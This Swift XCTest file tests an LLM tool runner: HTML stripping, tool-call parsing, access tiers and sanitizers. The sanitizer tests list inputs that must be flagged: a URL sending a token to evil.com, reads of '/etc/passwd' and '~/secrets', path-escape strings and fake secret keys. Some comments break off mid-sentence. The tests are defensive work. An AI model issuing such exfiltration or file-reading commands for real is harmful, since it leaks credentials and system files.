import XCTest
@testable import LLM

private enum OldHtml {
    static func htmlToText(_ html: String) -> String {
        collapseWhitespace(htmlStripped(mainContent(Array(html))))
    }

    static func htmlStripped(_ cs: [Character]) -> [Character] {
        var raw: [Character] = []
        var p = 0
        let n = cs.count
        while p < n {
            let c = cs[p]
            if c == "&" {
                if let dec = decodeEntity(cs, p) {
                    raw.append(contentsOf: dec.text)
                    p += dec.consumed
                } else {
                    raw.append(c)
                    p += 1
                }
            } else if c != "<" {
                raw.append(c)
                p += 1
            } else {
                p = consumeTag(cs, p, &raw)
            }
        }
        return raw
    }

    static func consumeTag(_ cs: [Character], _ p: Int,
                           _ raw: inout [Character]) -> Int {
        let n = cs.count
        var next = n
        if ciStarts(cs, p, Array("<!--")) {
            next = find(cs, Array("-->"), p + 4).map { e in e + 3 } ?? n
        } else {
            let closing = p + 1 < n && cs[p + 1] == "/"
            let nameAt = closing ? p + 2 : p + 1
            let drop = closing ? nil : dropTagAt(cs, nameAt)
            if let drop {
                next = skipElement(cs, p, drop, &raw)
            } else {
                if isBlockTag(cs, nameAt) { raw.append("\n") }
                next = find(cs, [">"], p).map { g in g + 1 } ?? n
            }
        }
        return next
    }

    static let dropTags = ["script", "style", "nav", "header",
                           "footer", "aside", "form", "math"]

    static func dropTagAt(_ cs: [Character], _ at: Int) -> [Character]? {
        let delims: Set<Character> = [">", " ", "/", "\t", "\n", "\r"]
        var result: [Character]? = nil
        var k = 0
        while result == nil && k < dropTags.count {
            let tag = Array(dropTags[k])
            let after = at + tag.count
            if ciStarts(cs, at, tag) && after < cs.count
                && delims.contains(cs[after]) {
                result = tag
            }
            k += 1
        }
        return result
    }

    static func skipElement(_ cs: [Character], _ p: Int,
                            _ tag: [Character],
                            _ raw: inout [Character]) -> Int {
        let close = Array("</") + tag
        var next = cs.count
        if let e = find(cs, close, p + 1, ci: true) {
            next = find(cs, [">"], e).map { g in g + 1 } ?? cs.count
        }
        raw.append("\n")
        return next
    }

    static func mainContent(_ cs: [Character]) -> [Character] {
        let inner = elementInner(cs, Array("main"))
            ?? elementInner(cs, Array("article"))
        return inner ?? cs
    }

    static func elementInner(_ cs: [Character],
                             _ tag: [Character]) -> [Character]? {
        let delims: Set<Character> = [">", " ", "/", "\t", "\n", "\r"]
        var result: [Character]? = nil
        let open = Array("<") + tag
        if let start = find(cs, open, 0, ci: true) {
            let after = start + open.count
            if after < cs.count && delims.contains(cs[after]),
               let gt = find(cs, [">"], after),
               let close = lastFind(cs, Array("</") + tag, gt + 1, ci: true) {
                result = Array(cs[(gt + 1)..<close])
            }
        }
        return result
    }

    static func lastFind(_ cs: [Character], _ needle: [Character],
                         _ from: Int, ci: Bool = false) -> Int? {
        var result: Int? = nil
        var i = cs.count - needle.count
        while result == nil && i >= from {
            var j = 0
            while j < needle.count && charEq(cs[i + j], needle[j], ci) {
                j += 1
            }
            if j == needle.count { result = i }
            i -= 1
        }
        return result
    }

    static let blockTags = [
        "p", "br", "div", "li", "tr", "h1", "h2", "h3", "h4", "h5", "h6",
        "ul", "ol", "table", "section", "article", "header", "footer",
        "blockquote", "pre", "hr",
    ]

    static func isBlockTag(_ cs: [Character], _ at: Int) -> Bool {
        let delims: Set<Character> = [">", " ", "/", "\t", "\n", "\r"]
        var result = false
        var k = 0
        while !result && k < blockTags.count {
            let tag = Array(blockTags[k])
            let after = at + tag.count
            if ciStarts(cs, at, tag) && after < cs.count
                && delims.contains(cs[after]) {
                result = true
            }
            k += 1
        }
        return result
    }

    static func decodeEntity(_ cs: [Character], _ p: Int)
        -> (text: [Character], consumed: Int)? {
        let n = cs.count
        var result: (text: [Character], consumed: Int)? = nil
        if p + 1 < n, let semi = find(cs, [";"], p + 1),
           semi - p <= 12, semi > p + 1 {
            if cs[p + 1] == "#" {
                result = decodeNumericEntity(cs, p, semi)
            } else if let cp = namedEntities[String(cs[(p + 1)..<semi])] {
                result = (utf8Chars(cp), semi - p + 1)
            }
        }
        return result
    }

    static func decodeNumericEntity(_ cs: [Character], _ p: Int,
                                    _ semi: Int)
        -> (text: [Character], consumed: Int)? {
        let hex = p + 2 < cs.count
            && (cs[p + 2] == "x" || cs[p + 2] == "X")
        let from = hex ? p + 3 : p + 2
        var result: (text: [Character], consumed: Int)? = nil
        if let cp = parseCodepoint(cs, from, semi, hex), cp != 0 {
            result = (utf8Chars(cp), semi - p + 1)
        }
        return result
    }

    static func parseCodepoint(_ cs: [Character], _ from: Int,
                               _ to: Int, _ hex: Bool) -> UInt32? {
        var cp: UInt32? = from < to ? 0 : nil
        let base: UInt32 = hex ? 16 : 10
        var q = from
        while q < to {
            if let acc = cp {
                let d = digitValue(cs[q], hex)
                cp = d >= 0 ? acc &* base &+ UInt32(d) : nil
            }
            q += 1
        }
        return cp
    }

    static func digitValue(_ c: Character, _ hex: Bool) -> Int {
        var result = -1
        if let a = c.asciiValue {
            if a >= 48 && a <= 57 {
                result = Int(a - 48)
            } else if hex && a >= 97 && a <= 102 {
                result = Int(a - 97 + 10)
            } else if hex && a >= 65 && a <= 70 {
                result = Int(a - 65 + 10)
            }
        }
        return result
    }

    static let namedEntities: [String: UInt32] = [
        "amp": 0x26, "lt": 0x3c, "gt": 0x3e, "quot": 0x22, "apos": 0x27,
        "nbsp": 0x20, "copy": 0xa9, "reg": 0xae, "mdash": 0x2014,
        "ndash": 0x2013, "hellip": 0x2026, "rsquo": 0x2019,
        "lsquo": 0x2018, "ldquo": 0x201c, "rdquo": 0x201d,
        "trade": 0x2122, "deg": 0xb0,
    ]

    static func utf8Chars(_ cp: UInt32) -> [Character] {
        Unicode.Scalar(cp).map { s in [Character(s)] } ?? []
    }

    static func collapseWhitespace(_ raw: [Character]) -> String {
        var clean: [Character] = []
        var nl = 0
        var sp = false
        for c in raw {
            if c == "\n" {
                nl += 1
                sp = false
            } else if c == " " || c == "\t" || c == "\r" {
                sp = true
            } else {
                if !clean.isEmpty {
                    if nl >= 2 {
                        clean.append(contentsOf: "\n\n")
                    } else if nl == 1 {
                        clean.append("\n")
                    } else if sp {
                        clean.append(" ")
                    }
                }
                nl = 0
                sp = false
                clean.append(c)
            }
        }
        return String(clean)
    }

    static func ciStarts(_ cs: [Character], _ at: Int,
                         _ kw: [Character]) -> Bool {
        var j = 0
        while j < kw.count && at + j < cs.count
            && lower(cs[at + j]) == kw[j] {
            j += 1
        }
        return j == kw.count
    }

    static func lower(_ c: Character) -> Character {
        var result = c
        if c >= "A" && c <= "Z", let a = c.asciiValue {
            result = Character(Unicode.Scalar(a + 32))
        }
        return result
    }

    static func find(_ cs: [Character], _ needle: [Character],
                     _ from: Int, ci: Bool = false) -> Int? {
        var result: Int? = nil
        var i = max(from, 0)
        let last = cs.count - needle.count
        while result == nil && i <= last {
            var j = 0
            while j < needle.count && charEq(cs[i + j], needle[j], ci) {
                j += 1
            }
            if j == needle.count { result = i }
            i += 1
        }
        return result
    }

    static func charEq(_ a: Character, _ b: Character, _ ci: Bool) -> Bool {
        ci ? lower(a) == lower(b) : a == b
    }
}

private let htmlSamples: [String] = [
    "<html><head><style>.a{color:red}</style></head><body><h1>Title</h1>"
        + "<p>Hello&nbsp;&amp; welcome</p><script>ignore()</script>"
        + "<p>Bye &#65; &#x42; &#0; &#xD800;</p></body></html>",
    "<div><ul><li>one <b>bold <i>nested</i></b></li><li>two</li></ul>"
        + "<table><tr><td>a</td><td>b</td></tr></table></div>",
    "<p>Amp & no entity; &unknown; &amp &copy; &hellip;&mdash;&deg;</p>",
    "<p>" + String(repeating: "no semicolon here & ", count: 40) + "</p>",
    "<body><nav>Home About Login</nav><main><h1>Story</h1>"
        + "<p>The real content.</p><form><input></form></main>"
        + "<footer>Copyright 2026</footer></body>",
    "<p>The density is</p><math><mi>a</mi><mo>(</mo></math>"
        + "<p>as shown above.</p><!-- a comment <p>inside</p> --><br/>tail",
    "<P>UPPER</P><Div>Case</DIV><formation>not a form</formation>"
        + "<navbar>not nav</navbar><pre>  spaced\n\n\n\tout  </pre>",
    "<article>caf\u{e9} na\u{ef}ve \u{1F600} <em>\u{6f22}\u{5b57}</em>"
        + "</article>",
    "plain text with\n\nblank lines\n   and   spaces\tand tabs",
    "<p>unterminated <b>tags <i>everywhere",
    "",
]

// Offline, deterministic ports of the network-independent assertions in
final class ToolsTests: XCTestCase {
    private func syntheticPage(bytes: Int) -> String {
        var page = "<html><head><title>t</title><style>p{margin:0}</style>"
            + "</head><body><nav>menu</nav><main>"
        let unit = htmlSamples.joined(separator: "\n")
        while page.utf8.count < bytes * 3 / 4 { page += unit }
        while page.utf8.count < bytes { page += "<p>tail & more text</p>" }
        return page + "</main></body></html>"
    }

    private func seconds(_ body: () -> String) -> (String, Double) {
        let began = Date()
        let out = body()
        return (out, Date().timeIntervalSince(began))
    }

    func testHtmlStripperMatchesTheCharacterReference() {
        for html in htmlSamples {
            XCTAssertEqual(Tools.htmlToText(html), OldHtml.htmlToText(html),
                           html)
        }
        let small = syntheticPage(bytes: 64 << 10)
        let old = seconds { OldHtml.htmlToText(small) }
        let new = seconds { Tools.htmlToText(small) }
        XCTAssertEqual(new.0, old.0)
        let page = syntheticPage(bytes: 2 << 20)
        let big = seconds { Tools.htmlToText(page) }
        print(String(format: "[html] %d KB page: Character %.3fs, bytes "
                         + "%.3fs; %d KB page: bytes %.3fs, %d chars out",
                     small.utf8.count >> 10, old.1, new.1,
                     page.utf8.count >> 10, big.1, big.0.count))
    }

    func testWikiIndexOpensOnce() throws {
        guard let url = WikiSlugs.bundledModel else {
            throw XCTSkip("no bundled minilm.gguf index")
        }
        var openSeconds = 0.0
        var querySeconds = 0.0
        for _ in 0 ..< 5 {
            let began = Date()
            let opened = WikiSlugs(ggufPath: url.path)
            openSeconds += Date().timeIntervalSince(began)
            XCTAssertNotNil(opened)
            let asked = Date()
            _ = opened?.query("what is dark matter", topK: 5)
            querySeconds += Date().timeIntervalSince(asked)
        }
        let index = WikiIndex(path: url.path)
        let first = seconds {
            index.with { w in ObjectIdentifier(w).debugDescription } ?? ""
        }
        let second = seconds {
            index.with { w in ObjectIdentifier(w).debugDescription } ?? ""
        }
        XCTAssertFalse(first.0.isEmpty)
        XCTAssertEqual(first.0, second.0)
        XCTAssertLessThan(second.1, first.1)
        XCTAssertNil(WikiIndex(path: "/nonexistent.gguf").with { w in
            w.articleCount
        })
        print(String(format: "[slugs] WikiSlugs init %.4fs and first query "
                         + "%.4fs (mean of 5 fresh instances); WikiIndex "
                         + "first %.4fs, second %.6fs", openSeconds / 5,
                     querySeconds / 5, first.1, second.1))
    }

    private func flagged(_ fn: String, _ args: [ToolArg]) -> Bool {
        Tools.sanitize(fn, args) != nil
    }

    // Anchor the path checks to a known workdir, as the C test does with
    // mkdir + chdir, restoring the previous directory afterwards.
    func testPathEscapeSanitizer() {
        let fm = FileManager.default
        let saved = fm.currentDirectoryPath
        let tmp = fm.temporaryDirectory
            .appendingPathComponent("santest_wd_\(UUID().uuidString)")
        try? fm.createDirectory(at: tmp, withIntermediateDirectories: true)
        XCTAssertTrue(fm.changeCurrentDirectoryPath(tmp.path))

        XCTAssertFalse(Tools.pathEscapesWorkdir("notes.txt"))
        XCTAssertFalse(Tools.pathEscapesWorkdir("a/b/c.txt"))
        XCTAssertFalse(Tools.pathEscapesWorkdir(""))
        XCTAssertFalse(Tools.pathEscapesWorkdir("."))
        XCTAssertFalse(Tools.pathEscapesWorkdir("sub/../ok.txt"))
        let wd = fm.currentDirectoryPath
        XCTAssertFalse(Tools.pathEscapesWorkdir(wd + "/in.txt"))

        XCTAssertTrue(Tools.pathEscapesWorkdir("../x"))
        XCTAssertTrue(Tools.pathEscapesWorkdir("../../x"))
        XCTAssertTrue(Tools.pathEscapesWorkdir("a/../../x"))
        XCTAssertTrue(Tools.pathEscapesWorkdir("/"))
        XCTAssertTrue(Tools.pathEscapesWorkdir("/etc/passwd"))
        XCTAssertTrue(Tools.pathEscapesWorkdir("~/secrets"))

        XCTAssertTrue(fm.changeCurrentDirectoryPath(saved))
        try? fm.removeItem(at: tmp)
    }

    func testShellCommandSanitizer() {
        XCTAssertTrue(flagged("execute_shell_command",
            [ToolArg(name: "command", value: "find / -name notes.txt")]))
        XCTAssertFalse(flagged("execute_shell_command",
            [ToolArg(name: "command", value: "ls -la")]))
        XCTAssertFalse(flagged("execute_shell_command",
            [ToolArg(name: "command",
                     value: "/usr/bin/python script.py")]))
        XCTAssertTrue(flagged("execute_shell_command",
            [ToolArg(name: "command", value: "cat /etc/hosts")]))
        XCTAssertFalse(flagged("execute_shell_command",
            [ToolArg(name: "command", value: "grep -rn TODO notes.txt")]))
        XCTAssertTrue(flagged("execute_shell_command",
            [ToolArg(name: "command", value: "find .. -type f")]))
    }

    func testPathToolSanitizer() {
        let fm = FileManager.default
        let saved = fm.currentDirectoryPath
        let tmp = fm.temporaryDirectory
            .appendingPathComponent("pathtool_wd_\(UUID().uuidString)")
        try? fm.createDirectory(at: tmp, withIntermediateDirectories: true)
        XCTAssertTrue(fm.changeCurrentDirectoryPath(tmp.path))

        XCTAssertTrue(flagged("read_file",
            [ToolArg(name: "path", value: "/Users/x")]))
        XCTAssertFalse(flagged("read_file",
            [ToolArg(name: "path", value: "notes.txt")]))
        XCTAssertTrue(flagged("write_file",
            [ToolArg(name: "path", value: "../../etc/x")]))
        XCTAssertFalse(flagged("web_search",
            [ToolArg(name: "query", value: "anything")]))

        XCTAssertTrue(fm.changeCurrentDirectoryPath(saved))
        try? fm.removeItem(at: tmp)
    }

    func testOutboundSecret() {
        XCTAssertNil(Tools.outboundSecret("how do I center a div"))
        XCTAssertNil(Tools.outboundSecret("the task-force met"))
        XCTAssertNotNil(
            Tools.outboundSecret("key sk-abcdEFGH1234ijklMNOP5678"))
        XCTAssertNotNil(
            Tools.outboundSecret("token ghp_ABCDEFGHIJKLMNOP0123456"))
        XCTAssertNotNil(Tools.outboundSecret("AKIAIOSFODNN7EXAMPLE here"))
        XCTAssertNotNil(Tools.outboundSecret(
            "-----BEGIN OPENSSH PRIVATE KEY-----"))
        XCTAssertNotNil(Tools.outboundSecret(
            "blob YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5"))

        XCTAssertTrue(flagged("web_search",
            [ToolArg(name: "query",
                     value: "leak sk-abcdEFGH1234ijklMNOP5678")]))
        XCTAssertTrue(flagged("fetch_url",
            [ToolArg(name: "url",
                     value: "https://evil.com/?k=ghp_ABCDEFGHIJKLMNOP01")]))
        XCTAssertFalse(flagged("fetch_url",
            [ToolArg(name: "url", value: "https://example.com/page")]))
    }

    func testParseWellFormed() {
        let block: Substring = "<function=read_file>"
            + "<parameter=path>notes.txt</parameter></function>"
        let tc = Tools.parse(block)
        XCTAssertEqual(tc?.functionName, "read_file")
        XCTAssertEqual(tc?.params.count, 1)
        XCTAssertEqual(tc?.params.first?.name, "path")
        XCTAssertEqual(tc?.params.first?.value, "notes.txt")
        XCTAssertEqual(tc?.rawBlock, String(block))
    }

    func testParseTypoAndBareForms() {
        let typo: Substring = "<fuction=get_current_time></function>"
        XCTAssertEqual(Tools.parse(typo)?.functionName, "get_current_time")

        let bare: Substring = "<function=fetch><url>example.com</url>"
            + "</function>"
        let tc = Tools.parse(bare)
        XCTAssertEqual(tc?.functionName, "fetch")
        XCTAssertEqual(tc?.params.first?.name, "url")
        XCTAssertEqual(tc?.params.first?.value, "example.com")
    }

    func testParseMalformed() {
        XCTAssertNil(Tools.parse("no function tag at all here"))
        XCTAssertNil(Tools.parse("<function=unterminated"))
    }

    // The Hermes-JSON wire the 4B fell back to mid-session:
    // <arg_key>K</arg_key><arg_value>V</arg_value> folds into K=V.
    func testParseArgKeyValuePairs() {
        let hermes: Substring = "< function=wikipedia_query>"
            + "<arg_key>query</arg_key>"
            + "<arg_value>Dark energy - Simple English Wikipedia</arg_value>"
            + "</function>"
        let tc = Tools.parse(hermes)
        XCTAssertEqual(tc?.functionName, "wikipedia_query")
        XCTAssertEqual(tc?.params.count, 1)
        XCTAssertEqual(tc?.params.first?.name, "query")
        XCTAssertEqual(tc?.params.first?.value,
                       "Dark energy - Simple English Wikipedia")
    }

    // One stray space after '<' demoted a complete call to quoted markup
    // on-device: the opener scan skips whitespace after '<'.
    func testParseWhitespaceFunctionTag() {
        let spaced: Substring = "\n< function=wikipedia_query>"
            + "<parameter=query>Dark matter cosmology</parameter>"
            + "</function>\n"
        let tc = Tools.parse(spaced)
        XCTAssertEqual(tc?.functionName, "wikipedia_query")
        XCTAssertEqual(tc?.params.first?.value, "Dark matter cosmology")
        let newlined: Substring = "<\nfunction=calculator></function>"
        XCTAssertEqual(Tools.parse(newlined)?.functionName, "calculator")
    }

    // The per-turn dedupe memo: an article notes once, reads back until
    // reset (the turn boundary), then reads as fresh again.
    func testTurnMemo() {
        let memo = TurnMemo()
        XCTAssertNil(memo.title(for: "42"))
        memo.note("42", "Dark matter")
        XCTAssertEqual(memo.title(for: "42"), "Dark matter")
        XCTAssertNil(memo.title(for: "7"))
        memo.reset()
        XCTAssertNil(memo.title(for: "42"))
    }

    // Related links keep only titles the returned body mentions (the
    func testRelatedLinksFilter() {
        let body = "Dark matter was proposed by Jan Oort in 1932. "
            + "Galaxy rotation curves also hint at it."
        let links = ["1932", "Aardvark", "Galaxy", "Jan Oort", "Zebra"]
        XCTAssertEqual(Tools.relatedIn(body, links: links),
                       ["Galaxy", "Jan Oort"])
        XCTAssertEqual(
            Tools.relatedIn("alpha beta", links: ["Alpha", "Beta"], cap: 1),
            ["Alpha"])
        XCTAssertEqual(Tools.relatedIn("", links: ["Galaxy"]), [])
    }

    // The embedding pick is cross-checked against exact titles unless it is
    func testNeedsTitleRescue() {
        let darkroom = SlugHit(id: "1", title: "Darkroom", distance: 60)
        XCTAssertTrue(Tools.needsTitleRescue(darkroom, "dark matter"))
        let named = SlugHit(id: "2", title: "Dark matter", distance: 60)
        XCTAssertFalse(Tools.needsTitleRescue(named, "what is dark matter"))
        let weak = SlugHit(id: "3", title: "Dark matter", distance: 100)
        XCTAssertTrue(Tools.needsTitleRescue(weak, "what is dark matter"))
        XCTAssertTrue(Tools.needsTitleRescue(nil, "anything"))
    }

    func testFindToolCall() {
        let stream = "reasoning... <tool_call><function=x></function>"
            + "</tool_call> trailing"
        let range = Tools.findToolCall(in: stream, from: 0)
        XCTAssertNotNil(range)
        if let range {
            let body = stream[range]
            XCTAssertEqual(Tools.parse(body)?.functionName, "x")
        }
        XCTAssertNil(Tools.findToolCall(in: "<tool_call>open only", from: 0))
    }

    func testHtmlToText() {
        let html = "<html><head><style>.a{color:red}</style></head>"
            + "<body><h1>Title</h1><p>Hello&nbsp;&amp; welcome</p>"
            + "<script>ignore()</script><p>Bye &#65;</p></body></html>"
        let text = Tools.htmlToText(html)
        XCTAssertTrue(text.contains("Title"))
        XCTAssertTrue(text.contains("Hello & welcome"))
        XCTAssertTrue(text.contains("Bye A"))
        XCTAssertFalse(text.contains("color:red"))
        XCTAssertFalse(text.contains("ignore()"))
    }

    // MathML drops wholesale: each <mi>/<mo> token is a single character (a
    func testHtmlMathDropped() {
        let page = "<p>The density is</p>"
            + "<math xmlns=\"http://www.w3.org/1998/Math/MathML\">"
            + "<semantics><mrow><mi>a</mi><mo>(</mo><mi>t</mi><mo>)</mo>"
            + "</mrow><annotation encoding=\"application/x-tex\">"
            + "{\\displaystyle a(t)}</annotation></semantics></math>"
            + "<p>as shown above.</p>"
        let text = Tools.htmlToText(page)
        XCTAssertTrue(text.contains("The density is"), text)
        XCTAssertTrue(text.contains("as shown above."), text)
        XCTAssertFalse(text.contains("displaystyle"), text)
        XCTAssertFalse(text.contains("( t )"), text)
    }

    func testHtmlReadabilityLite() {
        // With a <main>, narrow to it: nav/footer chrome outside is dropped.
        let page = "<body><nav>Home About Login</nav>"
            + "<main><h1>Story</h1><p>The real content.</p></main>"
            + "<footer>Copyright 2026</footer></body>"
        let text = Tools.htmlToText(page)
        XCTAssertTrue(text.contains("The real content."))
        XCTAssertFalse(text.contains("Login"), text)
        XCTAssertFalse(text.contains("Copyright"), text)

        // No <main>/<article>: keep the body but still drop chrome tags, so we
        // never return LESS than the plain strip.
        let bare = "<body><nav>Menu items</nav><p>Body text here.</p>"
            + "<aside>Ad slot</aside></body>"
        let t2 = Tools.htmlToText(bare)
        XCTAssertTrue(t2.contains("Body text here."))
        XCTAssertFalse(t2.contains("Menu items"), t2)
        XCTAssertFalse(t2.contains("Ad slot"), t2)
    }

    func testDeliverTextCapAndOffset() {
        let full = Tools.deliverText("abcdefghij", -1, 0)
        XCTAssertEqual(full, "abcdefghij")
        let capped = Tools.deliverText("abcdefghij", 4, 0)
        XCTAssertTrue(capped.hasPrefix("abcd"))
        XCTAssertTrue(capped.contains("truncated"))
        XCTAssertEqual(Tools.deliverText("", 10, 0), "(empty)")
        XCTAssertTrue(
            Tools.deliverText("abc", 10, 99).contains("beyond the end"))
    }

    // A near-done page keeps the plain "for more" marker; a long page states
    func testDeliverTextMarkerScales() {
        let near = Tools.deliverText("abcdefghij", 4, 0)
        XCTAssertTrue(near.contains("for more"), near)
        XCTAssertFalse(near.contains("ONLY"), near)
        let long = Tools.deliverText(String(repeating: "x", count: 100),
                                     10, 0)
        XCTAssertTrue(long.contains("~9 more calls"), long)
        XCTAssertTrue(long.contains("ONLY if you truly need"), long)
        XCTAssertTrue(long.contains("of 100"), long)
    }

    // An exact (url, offset) repeat grounds instead of re-delivering (the KV
    func testFetchExactRepeatGrounds() async {
        let memo = TurnMemo()
        memo.notePage("https://example.com", "cached text here")
        memo.noteSlice("https://example.com", 0)
        let repeated = await Tools.fetch("https://example.com", limit: 100,
                                         offset: 0, memo: memo)
        XCTAssertTrue(repeated.contains("already fetched"), repeated)
        let paged = await Tools.fetch("https://example.com", limit: 100,
                                      offset: 7, memo: memo)
        XCTAssertTrue(paged.contains("text here"), paged)
        memo.reset()
        XCTAssertFalse(memo.sliceDelivered("https://example.com", 0))
    }

    // The per-turn page cache: a URL notes once and reads back until
    // reset; the entry cap evicts oldest-first.
    func testTurnMemoPageCache() {
        let memo = TurnMemo()
        XCTAssertNil(memo.page(for: "a"))
        memo.notePage("a", "text A")
        XCTAssertEqual(memo.page(for: "a"), "text A")
        for i in 0 ..< TurnMemo.maxPages {
            memo.notePage("u\(i)", "t\(i)")
        }
        XCTAssertNil(memo.page(for: "a"), "oldest entry must evict")
        XCTAssertEqual(memo.page(for: "u0"), "t0")
        memo.reset()
        XCTAssertNil(memo.page(for: "u0"))
    }

    func testUnknownToolUnavailable() async {
        let runner = SafeToolRunner()
        let out = await runner.execute("read_file",
            [ToolArg(name: "path", value: "notes.txt")])
        XCTAssertEqual(
            out, "error: tool read_file unavailable in this environment")
    }

    // The two network tiers advertise and refuse independently: offline is
    func testAccessTiers() async {
        let offline = SafeToolRunner(slugsPath: nil, wikipedia: false,
                                     network: false)
        XCTAssertEqual(offline.tools.map { t in t.name },
                       ["get_current_time", "calculator"])
        let wiki = SafeToolRunner(slugsPath: nil, wikipedia: true,
                                  network: false)
        let wikiNames = wiki.tools.map { t in t.name }
        XCTAssertTrue(wikiNames.contains("get_news"))
        XCTAssertFalse(wikiNames.contains("web_search"))
        let refused = await wiki.execute("web_search",
            [ToolArg(name: "query", value: "x")])
        XCTAssertTrue(refused.hasPrefix("error:"), refused)
        let full = SafeToolRunner(slugsPath: nil, wikipedia: true,
                                  network: true)
        let fullNames = full.tools.map { t in t.name }
        XCTAssertTrue(fullNames.contains("web_search"))
        XCTAssertTrue(fullNames.contains("get_weather"))
        // No wikipedia_query without the on-device index, and its
        // cross-reference must not appear in the search spec then.
        XCTAssertFalse(fullNames.contains("wikipedia_query"))
        let search = full.tools.first { t in t.name == "web_search" }
        XCTAssertFalse(search?.description.contains("wikipedia_query") == true,
                       "spec references an unadvertised tool")
    }

    // Search operators empty Mwmbl's whole result set, so they are dropped
    func testStripOperators() {
        XCTAssertEqual(
            Tools.stripOperators("site:wikipedia.org dark matter"),
            "dark matter")
        XCTAssertEqual(
            Tools.stripOperators("dark matter filetype:pdf intitle:intro"),
            "dark matter")
        XCTAssertEqual(Tools.stripOperators("\"dark matter\""), "dark matter")
        XCTAssertEqual(Tools.stripOperators("plain query"), "plain query")
        XCTAssertEqual(Tools.stripOperators("site:x.com"), "site:x.com")
    }

    // Corpus/tool meta words drag the embedding off the subject; the strip
    func testStripMetaWords() {
        XCTAssertEqual(
            Tools.stripMetaWords("Dark Matter Simple English Wikipedia"),
            "dark matter")
        XCTAssertEqual(
            Tools.stripMetaWords("according to wikipedia what is a quark"),
            "what is a quark")
        XCTAssertEqual(Tools.stripMetaWords("wikipedia"), "wikipedia")
    }

    // The re-lay filter's schema surface: advertised names parse from the
    // spec JSON, aliases canonicalize only onto advertised names.
    func testParameterNamesAndAliases() {
        let names = Tools.parameterNames(
            "{\"type\":\"object\",\"properties\":{"
            + "\"query\":{\"type\":\"string\"},"
            + "\"count\":{\"type\":\"integer\"}}}")
        XCTAssertEqual(names, ["query", "count"])
        XCTAssertEqual(Tools.parameterNames("{}"), [])
        XCTAssertEqual(Tools.canonicalArgName("query", names), "query")
        XCTAssertEqual(Tools.canonicalArgName("q", names), "query")
        XCTAssertNil(Tools.canonicalArgName("arg_value", names))
        XCTAssertNil(Tools.canonicalArgName("q", ["url"]))
    }

    // The exact-title rescue over the bundled Simple English index: a query
    func testTitleMatchRescue() throws {
        guard let url = WikiSlugs.bundledModel,
              let w = WikiSlugs(ggufPath: url.path) else {
            throw XCTSkip("no bundled minilm.gguf index")
        }
        let hit = w.titleMatch("tell me about albert einstein")
        XCTAssertEqual(hit?.title.lowercased(), "albert einstein")
        XCTAssertEqual(hit?.distance, 0)
        XCTAssertTrue(hit?.isConfident == true)
        // Gibberish must not rescue, and neither must a query whose only
        // title-shaped words are function words (the corpus has "This").
        XCTAssertNil(w.titleMatch("zzxqy qwwrgh vvbnk"))
        XCTAssertNil(w.titleMatch("please tell me about this"))
        XCTAssertEqual(WikiSlugs.foldWords("St. Louis"), "st louis")
    }
}
